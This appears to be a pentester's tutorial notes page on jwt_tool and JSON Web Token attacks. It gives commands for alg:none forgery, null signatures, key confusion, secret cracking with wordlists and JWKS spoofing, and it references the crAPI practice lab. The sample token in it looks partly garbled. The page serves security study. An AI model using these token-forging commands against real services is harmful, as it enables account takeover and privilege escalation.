---
title: JWT tool
author: amandaguglieri
draft: false
TableOfContents: true
---

# JWT tool

### JWT attacks

Two tools: [jwt.io](https://jwt.io) and [jwt_tools](https://github.com/ticarpi/jwt_tool).

To see a jwt decoded on your CLI:

```bash
jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk
1NDgyOTl9.yeyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk121Lj2Doa7rA9oUQk1Px7b2hUCMQJeyCsGYLbJ8hZMWc7304aX_hfkLB__1o2YfU49VajMBhhRVP_OYNafttug 
```

Result:

![jwt ](img/jwt-tool.png)


Also, to see the decoded jwt, knowing that is encoded in base64, we could echo each of its parts:

```bash
echo eyJhbGciOiJIUzUxMiJ9 | base64 -d  && echo eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0
IjoxNjY5NDYxODk5LCJleHAiOjE2Njk1NDgyOTl9 | base64 -d
```

Results:

```
{"alg":"HS512"}{"sub":"hapihacker@hapihacher.com","iat":1669461899,"exp":1669548299} 
```

To run a JWT scan with jwt_tool, run: 

```bash
jwt_tool -t <http://target-site.com/> -rh "<Header>: <JWT_Token>" -M pb
# in the target site specify a path that leverages a call to a token
# replace Header with the name of the Header and JWT_Tocker with the actual token.
# -M: Scanning mode. 'pb' is playbook audit. 'er': fuzz existing claims to force errors. 'cc': fuzz common claims. 'at': All tests.
```

Example:

![jwt ](img/jwt-tool2.png)


Some more jwt_tool flags that may come in hand:

```
# -X EXPLOIT, --exploit EXPLOIT
#                        eXploit known vulnerabilities:
#                        a = alg:none
#                        n = null signature
#                        b = blank password accepted in signature
#                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
#                        k = key confusion (specify public key with -pk)
#                        i = inject inline JWKS

```


#### The none attack

A JWT with "none" as its algorithm is a free ticket. Modify user and become admin, root,... 
Also, in poorly implemented JWT, sometimes user and password can be found in the payload.

To craft a jwt with "none" as the value for "alg", run:

```bash
jwt_tool <JWT_Token> -X a
```


#### The null signature attack

Second attack in this section is removing the signature from the token. This can be done by erasing the signature altogether and leaving the last period in place.


#### The blank password accepted in signature

Launching this attack is relatively simple. Just remove the password value from the payload and leave it in blank. Then, regenerate the jwt.

Also, with jwt_tool, run:

```bash 
jwt_tool <JWT_Token> -X b
```
 
#### The algorithm switch (or key-confusion) attack

A more likely scenario than the provider accepting no algorithm is that they accept multiple algorithms. For example, if the provider uses RS256 but doesn’t limit the acceptable algorithm values, we could alter the algorithm to HS256. This is useful, as RS256 is an asymmetric encryption scheme, meaning we need both the provider’s private key and a public key in order to accurately hash the JWT signature. Meanwhile, HS256 is symmetric encryption, so only one key is used for both the signature and verification of the token. If you can discover the provider’s RS256 public key and then switch the algorithm from RS256 to HS256, there is a chance you may be able to leverage the RS256 public key as the HS256 key.

```bash
jwt_tool <JWT_Token> -X k -pk public-key.pem
# You will need to save the captured public key as a file on your attacking machine.
```


#### The jwt crack attack

JWT_Tool can still test 12 million passwords in under a minute. To perform a JWT Crack attack using JWT_Tool, use the following command:

```bash
jwt_tool <JWT Token> -C -d /wordlist.txt
# -C indicates that you are conducting a hash crack attack
# -d specifies the dictionary or wordlist
```

You can generate this wordlist for the secret signature of the json web token by using [crunch](crunch-md).

Once you crack the secret of the signature, we can create our own trusted tokens. 
1. Grab another user email (in the crapi app, from the data exposure vulnerability when getting the forum (GET {{baseUrl}}/community/api/v2/community/posts/recent).
2. Generate a token with the secret.


#### Spoofing JWKS 

Specify JWS URL with -ju, or set in jwtconf.ini to automate this attack.


#### Inject inline JWKS

